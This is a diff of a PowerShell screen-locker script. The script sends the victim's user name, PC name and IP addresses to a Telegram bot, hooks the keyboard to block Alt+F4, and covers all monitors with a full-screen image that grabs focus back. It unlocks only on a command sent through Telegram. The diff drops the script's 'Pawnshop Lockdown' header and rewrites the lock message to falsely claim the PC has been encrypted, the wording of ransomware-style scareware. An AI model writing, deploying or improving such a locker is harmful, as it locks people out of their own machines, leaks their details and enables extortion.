@@ -1,8 +1,3 @@
-# ==========================
-# Pawnshop Lockdown Script v2.5
-# Blocks All Keys Except 'C' + Telegram Unlock
-# ==========================
-
 # SETTINGS
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
@@ -25,14 +20,14 @@ function Send-Telegram-Message {
 
     try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }
 
-    $message = "🔒 PC-ul $user ($pc) a fost blocat.nIP: $ipLocal | $ipPublicnnDeblocare: $unlockCommand"
+    $message = "PC-ul $user ($pc) a fost criptat cu succes.nIP: $ipLocal | $ipPublicnnUnlock it: $unlockCommand"
     $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
     Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
 }
 
 Send-Telegram-Message
 
-# KEYBOARD BLOCKER: Block ALL keys except 'C'
+# KEYBOARD BLOCKER: Reliable Alt+F4 prevent only
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -45,6 +40,10 @@ public class KeyBlocker {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private const int WM_SYSKEYDOWN = 0x0104;
+    private const int WM_KEYUP = 0x0101;
+    private const int WM_SYSKEYUP = 0x0105;
+
+    private static bool altPressed = false;
 
     [DllImport("user32.dll")]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -66,10 +65,23 @@ public class KeyBlocker {
     }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+        if (nCode >= 0) {
             int vkCode = Marshal.ReadInt32(lParam);
-            if (vkCode == 0x43) Environment.Exit(0); // 'C' key allowed
-            return (IntPtr)1; // Block all other keys
+
+            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
+                // C closes app (developer backdoor)
+                if (vkCode == 0x43) Environment.Exit(0);
+
+                // ALT key tracking
+                if (vkCode == 0x12) altPressed = true;
+
+                // Block Alt+F4
+                if ((vkCode == 0x73) && altPressed) return (IntPtr)1;
+            }
+
+            if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
+                if (vkCode == 0x12) altPressed = false;
+            }
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
@@ -78,22 +90,34 @@ public class KeyBlocker {
 
 [KeyBlocker]::Block()
 
-# FULLSCREEN FORM
+# FULLSCREEN ON ALL MONITORS
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
 $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
-        FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true;
-        Location = $screen.Bounds.Location; Size = $screen.Bounds.Size;
-        Cursor = [System.Windows.Forms.Cursors]::None; BackColor = 'Black'
+        FormBorderStyle = 'None'
+        WindowState = 'Maximized'
+        StartPosition = 'Manual'
+        TopMost = $true
+        Location = $screen.Bounds.Location
+        Size = $screen.Bounds.Size
+        Cursor = [System.Windows.Forms.Cursors]::None
+        BackColor = 'Black'
     }
+
     $pb = New-Object Windows.Forms.PictureBox -Property @{
-        Image = [System.Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'StretchImage'
+        Image = [System.Drawing.Image]::FromFile($tempImagePath)
+        Dock = 'Fill'
+        SizeMode = 'StretchImage'
     }
+
     $form.Add_Deactivate({ $form.Activate() })
-    $form.Controls.Add($pb); $form.Show(); $form
+    $form.Controls.Add($pb)
+    $form.Show()
+    $form
 }
 
-# TELEGRAM LISTENER TIMER
+# TELEGRAM LISTENER WITH TIMER
 $offset = 0
 try {
     $initialUpdates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -UseBasicParsing -TimeoutSec 5
@@ -110,7 +134,7 @@ $timer.Add_Tick({
         $response = Invoke-RestMethod $url -UseBasicParsing -TimeoutSec 5
         foreach ($update in $response.result) {
             $offset = $update.update_id + 1
-            if ($update.message -and $update.message.text -eq $unlockCommand) {
+            if ($update.message.text -eq $unlockCommand) {
                 [System.Windows.Forms.Application]::Exit()
             }
         }
@@ -118,7 +142,7 @@ $timer.Add_Tick({
 })
 $timer.Start()
 
-# START LOOP
+# START APP LOOP
 [System.Windows.Forms.Application]::Run()
 
 # CLEANUP
